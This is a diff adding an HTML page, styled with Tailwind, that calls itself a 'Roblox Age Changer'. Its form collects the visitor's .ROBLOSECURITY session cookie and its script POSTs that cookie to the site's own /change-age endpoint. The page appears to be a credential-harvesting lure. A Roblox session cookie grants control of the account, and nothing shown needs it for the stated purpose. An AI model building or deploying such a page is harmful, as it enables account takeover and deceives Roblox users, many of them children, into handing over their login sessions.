@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Age Changer</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen p-4">
+  <div class="bg-gray-800 p-6 rounded-xl w-full max-w-md shadow-xl">
+    <h1 class="text-xl font-bold mb-4 text-cyan-400 text-center">Roblox Age Changer</h1>
+    <form id="ageForm" class="space-y-4">
+      <input type="password" id="cookie" placeholder=".ROBLOSECURITY Cookie" required
+             class="w-full p-2 bg-gray-700 border border-cyan-500/30 rounded-md outline-none focus:ring-2 focus:ring-cyan-500"/>
+      <button type="submit"
+              class="w-full py-2 bg-gradient-to-r from-cyan-500 to-blue-500 hover:scale-105 transition rounded-lg font-semibold">
+        Change Age
+      </button>
+    </form>
+    <div id="result" class="mt-4 text-center text-sm text-blue-300">Status will appear here.</div>
+  </div>
+
+  <script>
+    const form = document.getElementById("ageForm");
+    const result = document.getElementById("result");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const cookie = document.getElementById("cookie").value;
+      result.textContent = "⏳ Checking...";
+      result.className = "mt-4 text-center text-sm text-blue-300";
+
+      try {
+        const res = await fetch("/change-age", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cookie })
+        });
+
+        const data = await res.json();
+        if (data.status === "success") {
+          result.textContent = `✅ Age changed for ${data.username}`;
+          result.className = "mt-4 text-center text-green-400";
+        } else {
+          result.textContent = `❌ ${data.error || "Unknown error"}`;
+          result.className = "mt-4 text-center text-red-400";
+        }
+      } catch (err) {
+        result.textContent = `❌ Failed: ${err.message}`;
+        result.className = "mt-4 text-center text-red-400";
+      }
+    });
+  </script>
+</body>
+</html>
